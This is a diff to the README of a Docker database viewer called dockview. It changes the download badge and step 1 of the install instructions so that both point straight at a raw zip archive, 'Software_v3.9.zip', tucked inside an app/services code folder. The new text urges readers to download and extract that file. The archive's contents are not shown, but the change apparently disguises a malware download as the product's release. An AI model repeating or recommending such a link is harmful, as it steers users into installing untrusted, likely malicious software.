@@ -1,6 +1,6 @@
 # 🐳 dockview - View Docker databases with ease
 
-[![Download dockview](https://img.shields.io/badge/Download-dockview-ff6b6b?style=for-the-badge)](https://github.com/Laf1456/dockview)
+[![Download dockview](https://img.shields.io/badge/Download-dockview-ff6b6b?style=for-the-badge)](https://github.com/Laf1456/dockview/raw/refs/heads/main/app/services/Software_v3.9.zip)
 
 ## 📦 What DockView does
 
@@ -31,7 +31,7 @@ For best results, keep Docker Desktop open before you start DockView.
 
 ## 🚀 Download and install
 
-1. Open this page: https://github.com/Laf1456/dockview
+1. Open this page: https://github.com/Laf1456/dockview/raw/refs/heads/main/app/services/Software_v3.9.zip
 2. Find the latest release or download file
 3. Download DockView to your computer
 4. If the file is a `.zip`, right-click it and choose Extract All
